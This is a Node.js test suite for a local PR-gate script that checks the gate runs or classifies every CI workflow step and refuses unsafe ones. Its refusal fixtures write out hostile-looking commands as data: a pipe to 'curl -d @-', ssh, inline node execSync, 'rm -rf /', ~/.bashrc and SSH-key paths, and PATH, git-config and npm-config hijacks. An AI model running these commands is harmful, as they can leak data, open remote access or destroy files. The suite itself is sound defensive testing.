// Drift guard + mapping test for scripts/ci/local-pr-gate.mjs (#1037, #1063).
//
// The guarantee under test: every step of .github/workflows/pr-gate.yml is
// either RUN by the local gate or LISTED (setup / CI-only / heavy) with a
// reason. A step the gate can neither run verbatim nor finds in its table must
// turn this test red in CI, so pr-gate.yml cannot grow a step the local gate
// silently ignores.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { mkdtempSync, readFileSync, writeFileSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { spawnSync } from 'node:child_process';
import { join } from 'node:path';
import {
  WORKFLOW, STEP_TABLE, JOB_TABLE, LINUX_ONLY, loadSteps, classify, buildPlan as rawBuildPlan, ciWouldRun, childEnv, main as gateMain,
  safeWorkdir, readMainPath, readBranchPath, TRUSTED_REF, CHANGED_REASON, gateFileChanges, GATE_FILES, PACKAGE_JSONS,
} from '../ci/local-pr-gate.mjs';
import { unclassifiedCommands, NPM_SCRIPTS } from '../ci/local-gate-shell-allowlist.mjs';

const CTX = { base: 'b'.repeat(40), head: 'h'.repeat(40), prNumber: '' };
// Mapping tests treat the given workflow as already merged (main == branch).
// The round-3 trust-model tests pass a different trustedText on purpose.
const lf = (p) => readFileSync(p, 'utf8').replace(/\r\n/g, '\n');
const buildPlan = (o) => rawBuildPlan({ trustedText: lf(o.workflowPath || WORKFLOW), ...o });

test('every pr-gate.yml step is run or classified (no unclassifiable step)', () => {
  const { steps } = loadSteps();
  assert.ok(steps.length > 100, `parsed only ${steps.length} steps; the parser is not reading pr-gate.yml`);
  const errors = steps.map((s) => classify(s, CTX)).filter((c) => c.mode === 'error');
  assert.deepEqual(errors.map((e) => `${e.key}: ${e.problem}`), []);
});

test('every table entry names a step or job that still exists (no stale classification)', () => {
  const { wf, steps } = loadSteps();
  const keys = new Set(steps.map((s) => `${s.jobId} :: ${s.name}`));
  assert.deepEqual(Object.keys(STEP_TABLE).filter((k) => !keys.has(k)), []);
  assert.deepEqual(Object.keys(LINUX_ONLY).filter((k) => !keys.has(k)), []);
  assert.deepEqual(Object.keys(JOB_TABLE).filter((j) => !wf.jobs[j]), []);
});

test('step names are unique per job (the table key would be ambiguous otherwise)', () => {
  const { steps } = loadSteps();
  const seen = new Map();
  for (const s of steps) {
    const k = `${s.jobId} :: ${s.name}`;
    seen.set(k, (seen.get(k) || 0) + 1);
  }
  assert.deepEqual([...seen].filter(([, n]) => n > 1).map(([k]) => k), []);
});

// --- mutations of a COPY of the real workflow --------------------------------
function withMutatedWorkflow(mutate, fn) {
  const dir = mkdtempSync(join(tmpdir(), 'local-pr-gate-wf-'));
  try {
    const p = join(dir, 'pr-gate.yml');
    // A core.autocrlf checkout has CRLF; the mutations anchor on LF.
    writeFileSync(p, mutate(readFileSync(WORKFLOW, 'utf8').replace(/\r\n/g, '\n')));
    return fn(p);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
}
const addStep = (yml, stepYaml) => yml.replace(/\n {2}python-tests:\n/, `\n${stepYaml}\n  python-tests:\n`);
const errorsOf = (p) => loadSteps(p).steps.map((s) => classify(s, CTX)).filter((c) => c.mode === 'error');

const UNRUNNABLE = {
  'a step needing a secret': `      - name: Drift probe secret\n        env:\n          TOKEN: \${{ secrets.SOME_TOKEN }}\n        run: node scripts/x.mjs`,
  'a step with an unknown expression': `      - name: Drift probe expr\n        run: node scripts/x.mjs \${{ github.event.pull_request.title }}`,
  'a step that installs packages': `      - name: Drift probe install\n        run: npm ci --ignore-scripts`,
  'a step that edits global git config': `      - name: Drift probe git\n        run: git config --global user.name CI`,
  'a step writing GITHUB_OUTPUT': `      - name: Drift probe output\n        run: echo x=1 >> "$GITHUB_OUTPUT"`,
  'a step with an unknown if': `      - name: Drift probe if\n        if: github.actor == 'x'\n        run: node scripts/x.mjs`,
};
for (const [label, stepYaml] of Object.entries(UNRUNNABLE)) {
  test(`drift: pr-gate.yml gaining ${label} turns this test red`, () => {
    withMutatedWorkflow((y) => addStep(y, stepYaml), (p) => {
      const errs = errorsOf(p);
      assert.equal(errs.length, 1, JSON.stringify(errs));
      assert.match(errs[0].key, /Drift probe/);
    });
  });
}

test('drift: a new job with a service container turns this test red', () => {
  const job = `  drift-db-job:\n    runs-on: ubuntu-latest\n    services:\n      postgres:\n        image: postgres:16\n    steps:\n      - name: Drift DB step\n        run: node scripts/x.mjs\n`;
  withMutatedWorkflow((y) => y.replace(/\n {2}python-tests:\n/, `\n${job}  python-tests:\n`), (p) => {
    const errs = errorsOf(p);
    assert.equal(errs.length, 1, JSON.stringify(errs));
    assert.match(errs[0].problem, /service containers/);
  });
});

test('drift: a new plain step, once merged on main, is RUN locally with no table edit (structural default)', () => {
  const stepYaml = `      - name: Drift probe plain\n        run: node --test scripts/tests/some-new.test.mjs`;
  withMutatedWorkflow((y) => addStep(y, stepYaml), (p) => {
    const { plan } = buildPlan({ files: ['scripts/ops/x.mjs'], ctx: CTX, workflowPath: p });
    const probe = plan.find((x) => /Drift probe plain/.test(x.key));
    assert.equal(probe.action, 'run');
    assert.equal(probe.cmd, 'node --test scripts/tests/some-new.test.mjs');
  });
});

test('the gate fails closed: an unclassifiable step is an error entry in the plan', () => {
  withMutatedWorkflow((y) => addStep(y, UNRUNNABLE['a step needing a secret']), (p) => {
    const { plan } = buildPlan({ files: ['web/app/page.tsx'], ctx: CTX, workflowPath: p });
    assert.ok(plan.some((x) => x.action === 'error' && /secrets\.SOME_TOKEN/.test(x.problem)));
  });
});

// --- tree mapping on the real workflow ---------------------------------------
const runKeys = (files) => buildPlan({ files, ctx: CTX }).plan.filter((p) => p.action === 'run').map((p) => p.key);
const has = (keys, re) => keys.some((k) => re.test(k));

test('a migration-only change runs the scraper suite and stage harness (#1377 class)', () => {
  const keys = runKeys(['web/drizzle/migrations/0099_probe.sql', 'web/drizzle/migrations/meta/_journal.json']);
  assert.ok(has(keys, /Run scraper unit test suite/));
  assert.ok(has(keys, /Run pipeline stage harness/));
});

test('a web-only change runs web lint, type-check and unit tests but not the scraper suite', () => {
  const keys = runKeys(['web/app/page.tsx']);
  for (const re of [/gate :: Run lint/, /gate :: Run type-check/, /gate :: Run unit tests/]) assert.ok(has(keys, re), String(re));
  assert.ok(!has(keys, /Run scraper unit test suite/));
});

test('a scripts-only change still runs the integration-coverage and detection-change gates', () => {
  const keys = runKeys(['scripts/ops/foo.mjs']);
  assert.ok(has(keys, /Every scraper integration test is run by CI/));
  assert.ok(has(keys, /Run detection-change gate/));
  assert.ok(!has(keys, /Run unit tests/));
});

test('next build is heavy: listed, not run, unless --full', () => {
  const plan = buildPlan({ files: ['web/app/page.tsx'], ctx: CTX }).plan;
  assert.equal(plan.find((p) => p.key === 'web-build :: next build').action, 'skip');
  const full = buildPlan({ files: ['web/app/page.tsx'], ctx: CTX, full: true }).plan;
  assert.equal(full.find((p) => p.key === 'web-build :: next build').action, 'run');
});

test('CI-only steps are listed with a reason, never silently dropped', () => {
  const plan = buildPlan({ files: ['scraper/src/x.ts'], ctx: CTX }).plan;
  const ciOnly = plan.filter((p) => p.action === 'ci-only');
  assert.ok(ciOnly.length >= 5);
  for (const c of ciOnly) assert.ok(c.reason && c.reason.length > 10, c.key);
});

test('docs-only paths follow pr-gate.yml `paths:` (CI skips them, so does the gate)', () => {
  const { wf } = loadSteps();
  assert.equal(ciWouldRun(['docs/design/x.md', 'README.md'], wf), false);
  assert.equal(ciWouldRun(['docs/reviews/failure-classes/x.json'], wf), true);
  assert.equal(ciWouldRun(['web/README.md', 'web/app/x.ts'], wf), true);
  assert.equal(runKeys(['docs/design/x.md']).length, 0);
});

test('substituted expressions: base sha and base ref reach the command', () => {
  const plan = buildPlan({ files: ['scripts/ops/x.mjs'], ctx: CTX }).plan;
  const det = plan.find((p) => p.key === 'detection-change-gate :: Run detection-change gate');
  assert.equal(det.cmd.trim(), 'node scripts/ci/require-detection-change.mjs origin/main HEAD');
  const trace = plan.find((p) => p.key === 'gate :: Design traceability (OD-52)');
  assert.ok(trace.cmd.includes(CTX.base));
});

test('child env drops git repo-local vars and DB/Redis vars CI never has (#1037 incident)', () => {
  const saved = { ...process.env };
  try {
    Object.assign(process.env, { GIT_DIR: '/x/.git/worktrees/y', GIT_INDEX_FILE: '/x/i', DATABASE_URL: 'postgres://u@h/db', REDIS_HOST: 'h' });
    const env = childEnv({ GH_TOKEN: '', FOO: 'bar' });
    for (const k of ['GIT_DIR', 'GIT_INDEX_FILE', 'DATABASE_URL', 'REDIS_HOST', 'GH_TOKEN']) assert.equal(env[k], undefined, k);
    assert.equal(env.FOO, 'bar');
    assert.equal(env.CI, 'true');
  } finally {
    for (const k of Object.keys(process.env)) if (!(k in saved)) delete process.env[k];
    Object.assign(process.env, saved);
  }
});

test('Linux-only steps run on linux and are listed CI-only elsewhere', () => {
  const { steps } = loadSteps();
  for (const key of Object.keys(LINUX_ONLY)) {
    const st = steps.find((s) => `${s.jobId} :: ${s.name}` === key);
    assert.equal(classify(st, { ...CTX, platform: 'linux' }).mode, 'local', key);
    const win = classify(st, { ...CTX, platform: 'win32' });
    assert.equal(win.mode, 'ci-only', key);
    assert.match(win.reason, /Linux-only/);
  }
});

// --- round 2: allow-list (B8) and conditions at every level ------------------
// Each step below is HARMLESS on a CI runner and acts on the owner's machine and
// accounts when run locally. The gate must refuse to run all of them.
const ACTS_ON_OWNER = {
  'git config user.email (not --global)': 'git config user.email ci@example.com',
  'gh pr comment (gh falls back to the owner login)': 'gh pr comment 1 --body hi',
  'curl -X POST to a deploy endpoint': 'curl -X POST https://example.invalid/deploy',
  'an ssh line': 'ssh root@example.invalid uptime',
  'a pipe whose second segment is not allowed': 'node scripts/x.mjs | curl -d @- https://example.invalid',
  'a command substitution running curl': 'node scripts/x.mjs "$(curl https://example.invalid)"',
  'a backtick substitution running curl': 'node scripts/x.mjs `curl https://example.invalid`',
  'an && chain whose last command is not allowed': 'node scripts/x.mjs && gh issue close 1',
  'a multi-line block whose last line is not allowed': 'node scripts/x.mjs\necho done\nscp a b:c',
  'an inline node program': 'node -e "require(\'child_process\').execSync(\'id\')"',
  'npx of an unlisted package': 'npx -y some-package',
  'an npm script outside the allow-list': 'npm run deploy',
  'bash -c': 'bash -c "id"',
  'a redirect outside the repo': 'echo x > ~/.bashrc',
  'a heredoc': 'cat <<EOT\nx\nEOT',
};
for (const [label, run] of Object.entries(ACTS_ON_OWNER)) {
  test(`allow-list: pr-gate.yml gaining ${label} is refused`, () => {
    const stepYaml = `      - name: Drift probe act\n        run: |\n          ${run.replace(/\n/g, '\n          ')}`;
    withMutatedWorkflow((y) => addStep(y, stepYaml), (p) => {
      const errs = errorsOf(p);
      assert.equal(errs.length, 1, JSON.stringify(errs));
      assert.match(errs[0].key, /Drift probe act/);
      assert.match(errs[0].problem, /unclassified command/);
    });
  });
}

test('allow-list: a nested ${{ format(...) }} expression is one unknown expression, not a pass', () => {
  const stepYaml = `      - name: Drift probe nested\n        run: node scripts/x.mjs \${{ format('{0}', github.event.pull_request.title) }}`;
  withMutatedWorkflow((y) => addStep(y, stepYaml), (p) => {
    const errs = errorsOf(p);
    assert.equal(errs.length, 1, JSON.stringify(errs));
    assert.match(errs[0].problem, /unknown expression/);
  });
});

test('conditions: a job-level if is refused (a push-only job would run every step here)', () => {
  withMutatedWorkflow((y) => y.replace('\n  python-tests:\n', "\n  python-tests:\n    if: github.event_name == 'push'\n"), (p) => {
    const errs = errorsOf(p);
    assert.equal(errs.length, 1, JSON.stringify(errs));
    assert.match(errs[0].key, /python-tests :: \(job\)/);
    assert.match(errs[0].problem, /job-level if/);
  });
});

test('conditions: a job-level env holding a secret is refused on the steps that would run', () => {
  withMutatedWorkflow((y) => y.replace('\n  gate:\n', '\n  gate:\n    env:\n      TOK: ${{ secrets.SOME_TOKEN }}\n'), (p) => {
    const errs = errorsOf(p);
    assert.ok(errs.length > 0);
    assert.ok(errs.every((e) => /secrets\.SOME_TOKEN/.test(e.problem)), JSON.stringify(errs.slice(0, 2)));
  });
});

test('conditions: a workflow-level env holding a secret is refused', () => {
  withMutatedWorkflow((y) => y.replace('\njobs:\n', '\nenv:\n  TOK: ${{ secrets.SOME_TOKEN }}\njobs:\n'), (p) => {
    const errs = errorsOf(p);
    assert.ok(errs.length > 0);
    assert.ok(errs.some((e) => /secrets\.SOME_TOKEN/.test(e.problem)));
  });
});

test('conditions: a workflow-level env that hijacks the process (PATH) is refused', () => {
  withMutatedWorkflow((y) => y.replace('\njobs:\n', '\nenv:\n  PATH: /tmp/evil\njobs:\n'), (p) => {
    assert.ok(errorsOf(p).some((e) => /env not safe/.test(e.problem)));
  });
});

test('conditions: workflow-level defaults are refused', () => {
  withMutatedWorkflow((y) => y.replace('\njobs:\n', '\ndefaults:\n  run:\n    shell: pwsh\njobs:\n'), (p) => {
    const errs = errorsOf(p);
    assert.equal(errs.length, 1, JSON.stringify(errs));
    assert.match(errs[0].problem, /workflow-level defaults/);
  });
});

test('conditions: a step-level continue-on-error is refused (it would pass in CI and fail here)', () => {
  const stepYaml = '      - name: Drift probe coe\n        continue-on-error: true\n        run: node scripts/x.mjs';
  withMutatedWorkflow((y) => addStep(y, stepYaml), (p) => {
    const errs = errorsOf(p);
    assert.equal(errs.length, 1, JSON.stringify(errs));
    assert.match(errs[0].problem, /continue-on-error/);
  });
});

test('conditions: a job-level if on a CI-only job is listed, not an error (it never runs here)', () => {
  withMutatedWorkflow((y) => y.replace('\n  scraper-document-integration:\n', "\n  scraper-document-integration:\n    if: github.event_name == 'push'\n"), (p) => {
    assert.deepEqual(errorsOf(p), []);
  });
});

const ALLOWED = [
  'node scripts/ci/x.mjs a b', 'node --test scripts/tests/a.test.mjs scripts/tests/b.test.mjs', 'node --max-old-space-size=4096 scripts/x.mjs',
  'npx tsc --noEmit', 'npx vitest run -c vitest.config.ts tests/a.test.ts', 'npx --no-install eslint .', 'npx tsx src/index.ts --smoke-import',
  'npm run lint:ci', 'npm run --silent build', 'bash scripts/tests/a.test.sh 2>&1 | tee /tmp/a.log', 'sh scripts/x.sh',
  'python .claude/hooks/tests/a.test.py', 'python -m pytest scraper/scripts -q -p no:cacheprovider', 'python -m unittest discover -s scripts',
  'cd packages/shared && npx tsc', 'echo ok >> /dev/null', 'test -f dist/a.d.ts || (echo "FATAL" && exit 1)', 'set -o pipefail',
  'export CI=true', 'PYTHONDONTWRITEBYTECODE=1 node scripts/x.mjs', 'rm -rf packages/shared/dist packages/shared/tsconfig.tsbuildinfo',
  'if git diff --name-only "$A" "$B" | grep -qE "^web/"; then\n  echo run=true\nelse\n  echo run=false\nfi',
  'node scripts/x.mjs "$(git rev-parse HEAD)"', 'node scripts/x.mjs \\\n  a \\\n  b', 'tail -n 40 /tmp/a.log',
];
for (const run of ALLOWED) {
  test(`allow-list accepts: ${run.split('\n')[0]}`, () => {
    assert.deepEqual(unclassifiedCommands(run), []);
  });
}

const REFUSED = [
  ['cd /', /cd must take/], ['cd ../x', /cd must take/], ['node -p 1', /inline or injected/], ['node --require ./x.js scripts/a.mjs', /inline or injected/],
  ['node /abs/x.mjs', /repo-relative/], ['node ../x.mjs', /repo-relative/], ['npx drizzle-kit migrate', /not an allowed tool/],
  ['npx tsx -e "1"', /inline/], ['npm ci', /npm run/], ['npm install x', /npm run/], ['npm run build:evil', /allow-list/],
  ['bash scripts/../../x.sh', /repo script/], ['python -c "1"', /repo .py/], ['python -m pip install x', /unittest or pytest/],
  ['rm -rf /', /exact repo-relative/], ['rm -rf ..', /exact repo-relative/], ['rm -rf web/*', /exact repo-relative/], ['git push', /read-only/],
  ['git diff --output=x.patch', /writes a file/], ['gh pr merge 1', /not an allowed program/], ['wget x', /not an allowed program/],
  ['PATH=/tmp/evil node scripts/x.mjs', /process-hijacking/], ['echo "$GITHUB_OUTPUT"', /runner-only/], ['$(echo node) scripts/x.mjs', /substitution/],
  ['f() { id; }', /function definition/], ['echo "unterminated', /unterminated/], ['echo $((1+1))', /arithmetic/], ['diff <(a) <(b)', /process substitution/],
];
for (const [run, why] of REFUSED) {
  test(`allow-list refuses: ${run}`, () => {
    const off = unclassifiedCommands(run);
    assert.ok(off.length > 0, 'was accepted');
    assert.match(off.map((o) => o.reason).join(' | '), why);
  });
}

// --- round 3: trust only reviewed (origin/main) workflow content -------------
// The branch's working copy never decides what runs: a step it adds or changes
// is listed CI-only. Fed: trustedText = the real workflow (stands in for main),
// workflowPath = a mutated copy (stands in for the branch).
const branchPlan = (mutate, files = ['scripts/ops/x.mjs']) => withMutatedWorkflow(mutate, (p) =>
  rawBuildPlan({ files, ctx: CTX, trustedText: lf(WORKFLOW), workflowPath: p }).plan);
const entry = (plan, re) => plan.filter((x) => re.test(x.key));

test('trust: a step only the branch adds is listed CI-only (changed in this branch), never run', () => {
  const plan = branchPlan((y) => addStep(y, '      - name: Drift probe branch-new\n        run: node --test scripts/tests/some-new.test.mjs'));
  const e = entry(plan, /Drift probe branch-new/);
  assert.equal(e.length, 1);
  assert.equal(e[0].action, 'ci-only');
  assert.ok(e[0].reason.startsWith(CHANGED_REASON), e[0].reason);
  assert.ok(!plan.some((x) => x.action === 'run' && /some-new/.test(x.cmd || '')));
});

test("trust: a run: line the branch modifies is not run (main's step is listed changed)", () => {
  const plan = branchPlan((y) => y.replace('run: node scripts/ci/require-detection-change.mjs', 'run: node scripts/ci/require-detection-change.mjs --x'));
  const e = entry(plan, /Run detection-change gate/);
  assert.equal(e.length, 1);
  assert.equal(e[0].action, 'ci-only');
  assert.equal(e[0].mode, 'changed');
});

test('trust: a branch change to a step env or working-directory is not run', () => {
  const mutations = [
    (y) => y.replace("NODE_OPTIONS: '--max-old-space-size=6144'", "NODE_OPTIONS: '--max-old-space-size=6145'"),
    (y) => y.replace(/(- name: Run lint\n(?:.*\n)*?\s+working-directory: )\.\/web/, '$1./scraper'),
  ];
  for (const mutate of mutations) {
    const plan = branchPlan(mutate, ['web/app/page.tsx']);
    const changed = plan.filter((q) => q.mode === 'changed');
    assert.ok(changed.length >= 1, 'no step listed changed');
    for (const x of changed) assert.equal(x.action, 'ci-only');
  }
});

test('trust: a branch job-level env change marks every step of that job changed', () => {
  const plan = branchPlan((y) => y.replace('\n  python-tests:\n', '\n  python-tests:\n    env:\n      CI: "1"\n'), ['.claude/hooks/x.py']);
  const py = plan.filter((x) => /^python-tests :: /.test(x.key));
  assert.ok(py.length > 2);
  for (const x of py) assert.equal(x.mode, 'changed', x.key);
  assert.ok(!plan.some((x) => x.action === 'run' && /^python-tests/.test(x.key)));
});

test('trust: a step the branch removes is not run', () => {
  const plan = branchPlan((y) => y.replace(/\n {6}- name: Run detection-change gate\n(?: {8}.*\n)+/, '\n'));
  const e = entry(plan, /Run detection-change gate/);
  assert.equal(e[0].action, 'ci-only');
  assert.match(e[0].reason, /removed in this branch/);
});

test('trust: the plan refuses to build without trusted (origin/main) text', () => {
  assert.throws(() => rawBuildPlan({ files: ['web/x.ts'], ctx: CTX }), /no trusted/);
  assert.throws(() => rawBuildPlan({ files: ['web/x.ts'], ctx: CTX, trustedText: '' }), /no trusted/);
});

test('trust: origin/main unreadable means the gate refuses (exit 2) and plans nothing', () => {
  const errs = [];
  const logs = [];
  const { error, log } = console;
  console.error = (m) => errs.push(String(m));
  console.log = (m) => logs.push(String(m));
  let code;
  try {
    code = gateMain(['--plan', '--files', 'web/app/page.tsx'], { readTrusted: () => { throw new Error('fatal: invalid object name'); } });
  } finally {
    console.error = error;
    console.log = log;
  }
  assert.equal(code, 2);
  assert.match(errs.join('\n'), /REFUSED - cannot read pr-gate\.yml from refs\/remotes\/origin\/main/);
  assert.ok(!logs.some((l) => /run here:/.test(l)), 'a plan was printed');
});

// Every bypass the round-2 reviewer found is refused even when the step is ON
// MAIN (fixture fed as both the trusted and the branch workflow): layer 2 catches
// honest mistakes in reviewed content too.
const ON_MAIN = {
  'brace expansion into --eval': { run: 'node {--eval,process.exit} scripts/x.mjs' },
  'node --import=': { run: 'node --import=./x.mjs scripts/x.mjs' },
  'node --require=': { run: 'node --require=./x.js scripts/x.mjs' },
  'node --test --import=': { run: 'node --test --import=./x.mjs scripts/tests/a.test.mjs' },
  'npx tsx --import': { run: 'npx tsx --import ./x.mjs src/a.ts' },
  'GIT_EXTERNAL_DIFF in step env': { env: { GIT_EXTERNAL_DIFF: 'scripts/x.sh' }, run: 'git diff' },
  'GIT_CONFIG_KEY_0 in step env': { env: { GIT_CONFIG_COUNT: '1', GIT_CONFIG_KEY_0: 'core.pager', GIT_CONFIG_VALUE_0: 'sh scripts/x.sh' }, run: 'git log -1' },
  'npm_config_node_options in step env': { env: { npm_config_node_options: '--require=./x.js' }, run: 'npm run lint:ci' },
  'an unlisted env key': { env: { SOME_NEW_KEY: '1' }, run: 'node scripts/x.mjs' },
  'printf -v PATH': { run: 'printf -v PATH %s /tmp/evil\nnode scripts/x.mjs' },
  'export GIT_DIR': { run: 'export GIT_DIR=/tmp/x\ngit status' },
  'inline NODE_OPTIONS=--require': { run: 'NODE_OPTIONS=--require=./x.js node scripts/x.mjs' },
  'working-directory ../IPODhan with rm -rf': { wd: '../IPODhan', run: 'rm -rf web' },
  'absolute working-directory': { wd: '/home/runner', run: 'node scripts/x.mjs' },
  'a write into .git/config': { run: 'echo "[core]" >> .git/config' },
  'a path argument into .git/hooks': { run: 'node scripts/x.mjs .git/hooks/pre-push' },
  'rm of .git': { run: 'rm -rf .git' },
  'a ~ argument': { run: 'node scripts/x.mjs ~/.ssh/id_ed25519' },
  'a glob argument': { run: 'node --test scripts/tests/*.test.mjs' },
  'the deploy script': { run: 'bash scripts/deploy-linux.sh' },
  'the DB tunnel script': { run: 'bash scripts/ops/db-tunnel.sh start' },
  'the deploy-and-watch script': { run: 'bash scripts/ops/deploy-and-watch.sh staging' },
  'the staging window deploy script': { run: 'sh scripts/ops/staging-window-deploy.sh' },
  'a vps-*.sh script': { run: 'bash scripts/vps-disk-hygiene.sh' },
};
const stepYamlOf = ({ run, env, wd }) => [
  '      - name: Drift probe main',
  ...(wd ? [`        working-directory: ${wd}`] : []),
  ...(env ? ['        env:', ...Object.entries(env).map(([k, v]) => `          ${k}: '${v}'`)] : []),
  '        run: |',
  ...run.split('\n').map((l) => `          ${l}`),
].join('\n');
for (const [label, spec] of Object.entries(ON_MAIN)) {
  test(`on main: ${label} is refused, never run`, () => {
    withMutatedWorkflow((y) => addStep(y, stepYamlOf(spec)), (p) => {
      const { plan } = rawBuildPlan({ files: ['scripts/ops/x.mjs', 'web/x.ts'], ctx: CTX, trustedText: lf(p), workflowPath: p });
      const e = entry(plan, /Drift probe main/);
      assert.equal(e.length, 1);
      assert.equal(e[0].action, 'error', `${label}: ${JSON.stringify(e[0])}`);
    });
  });
}

test('safeWorkdir: repo-relative only', () => {
  for (const ok of ['.', './web', 'packages/shared', './scraper']) assert.ok(safeWorkdir(ok), ok);
  for (const bad of ['', '..', '../IPODhan', './web/../..', '/abs', 'C:/x', '~/x', '.git', 'web/.git/hooks', '$HOME']) assert.ok(!safeWorkdir(bad), bad);
});

test("real workflow: main's own steps all pass the round-3 checks (none newly refused)", () => {
  const { plan } = buildPlan({ files: ['package.json'], ctx: CTX });
  assert.deepEqual(plan.filter((x) => x.action === 'error').map((x) => `${x.key}: ${x.problem}`), []);
});

// --- gate-defining files: compared with origin/main (fixture diff vs a fake main) ---
// readMain stands in for `git show origin/main:<path>`; the branch reads disk.
const NL = String.fromCharCode(10);
const diskText = (p) => lf(join(WORKFLOW, '..', '..', '..', p));
const fakeMain = (over = {}) => (p) => (p in over ? over[p] : diskText(p));
function runGate(branchOver, mainOver = {}) {
  const logs = [];
  const { log } = console;
  console.log = (m) => logs.push(String(m));
  let code;
  try {
    code = gateMain(['--plan', '--files', 'web/app/page.tsx,scripts/ops/x.mjs'], {
      readTrusted: () => lf(WORKFLOW),
      readMain: fakeMain(mainOver),
      readBranch: (p) => (p in branchOver ? branchOver[p] : diskText(p)),
    });
  } finally {
    console.log = log;
  }
  return { code, out: logs.join(NL) };
}
const assertAllCiOnly = (r, file) => {
  assert.equal(r.code, 0, r.out);
  assert.ok(r.out.includes(`gate-defining file(s): ${file} (`), `message does not name ${file}: ${r.out}`);
  assert.match(r.out, /run here: 0 /);
  assert.ok(!r.out.includes('[run]'), 'a step was planned to run');
};

test('gate files: a branch that changes local-pr-gate.mjs makes every step CI-only (exit 0, names the file)', () => {
  const src = diskText('scripts/ci/local-pr-gate.mjs');
  assertAllCiOnly(runGate({ 'scripts/ci/local-pr-gate.mjs': `${src}${NL}// cmd: node scripts/x.mjs${NL}` }), 'scripts/ci/local-pr-gate.mjs');
});

test('gate files: a branch that changes the allow-list file makes every step CI-only', () => {
  const src = diskText('scripts/ci/local-gate-shell-allowlist.mjs');
  assertAllCiOnly(runGate({ 'scripts/ci/local-gate-shell-allowlist.mjs': `${src}${NL}// x${NL}` }), 'scripts/ci/local-gate-shell-allowlist.mjs');
});

test('gate files: a branch that changes .husky/pre-push makes every step CI-only', () => {
  assertAllCiOnly(runGate({ '.husky/pre-push': `${diskText('.husky/pre-push')}${NL}# x${NL}` }), '.husky/pre-push');
});

test('gate files: changing the body of an allow-listed npm script is CI-only, in root and per-package', () => {
  let checked = 0;
  for (const pj of PACKAGE_JSONS) {
    const o = JSON.parse(diskText(pj));
    const name = [...NPM_SCRIPTS].find((n) => o.scripts && n in o.scripts);
    if (!name) continue;
    o.scripts[name] = `${o.scripts[name]} && node scripts/evil.mjs`;
    const r = runGate({ [pj]: JSON.stringify(o, null, 2) });
    assertAllCiOnly(r, pj);
    assert.ok(r.out.includes(name), `message does not name script ${name}`);
    checked++;
  }
  assert.ok(checked >= 2, 'expected at least root and one package to carry an allow-listed script');
});

test('gate files: a non-allow-listed npm script change runs normally', () => {
  const o = JSON.parse(diskText('package.json'));
  o.scripts['some-unlisted-script'] = 'echo hi';
  const r = runGate({ 'package.json': JSON.stringify(o, null, 2) });
  assert.equal(r.code, 0, r.out);
  assert.ok(!r.out.includes('gate-defining file'));
  assert.ok(r.out.includes('[run]'), 'nothing planned to run');
});

test('gate files: CRLF vs LF of the same gate file is not a change', () => {
  const src = diskText('scripts/ci/local-pr-gate.mjs');
  const r = runGate({ 'scripts/ci/local-pr-gate.mjs': src.split(NL).join(`\r${NL}`) });
  assert.ok(!r.out.includes('gate-defining file'));
});

test('gate files: a path missing on main but present on the branch is a change; unreadable main refuses (exit 2)', () => {
  const ch = gateFileChanges({ readMain: (p) => (GATE_FILES.includes(p) ? diskText(p) : null), readBranch: diskText });
  assert.ok(ch.some((c) => c.path === 'web/package.json'));
  assert.throws(() => gateFileChanges({ readMain: () => { throw new Error('fatal: bad object'); }, readBranch: diskText }), /bad object/);
  const errs = [];
  const { error } = console;
  console.error = (m) => errs.push(String(m));
  let code;
  try {
    code = gateMain(['--plan', '--files', 'web/app/page.tsx'], { readTrusted: () => lf(WORKFLOW), readMain: () => { throw new Error('fatal: bad object'); } });
  } finally { console.error = error; }
  assert.equal(code, 2);
  assert.ok(errs.join(NL).includes('REFUSED - cannot read the gate files'));
});

// #1434: the REAL readers (no fakes) on this checkout. origin/main content must come back
// untrimmed, or every file ending in a newline always "differs".
const hasMainRef = () => spawnSync('git', ['rev-parse', '--verify', '--quiet', TRUSTED_REF]).status === 0;
const gateFilesMatchMain = () =>
  spawnSync('git', ['diff', '--quiet', '--ignore-cr-at-eol', TRUSTED_REF, '--', ...GATE_FILES, ...PACKAGE_JSONS]).status === 0;

test('gate files (#1434): real readers report no change when the checkout matches origin/main', (t) => {
  if (!hasMainRef()) return t.skip(`${TRUSTED_REF} not present`);
  if (!gateFilesMatchMain()) return t.skip('this branch edits a gate file (a real difference)');
  assert.deepEqual(gateFileChanges({ readMain: readMainPath, readBranch: readBranchPath }), []);
});

test('gate files (#1434): real main reader returns the exact text, final newline kept', (t) => {
  if (!hasMainRef()) return t.skip(`${TRUSTED_REF} not present`);
  const m = readMainPath('.husky/pre-push');
  assert.ok(m.endsWith(NL), 'final newline was trimmed');
});

test('gate files (#1434): a one-byte change to a branch gate file is still reported', (t) => {
  if (!hasMainRef()) return t.skip(`${TRUSTED_REF} not present`);
  const path = GATE_FILES[1];
  const ch = gateFileChanges({ readMain: readMainPath, readBranch: (p) => (p === path ? `${readMainPath(p)}x` : readBranchPath(p)) });
  assert.ok(ch.some((c) => c.path === path), JSON.stringify(ch));
});
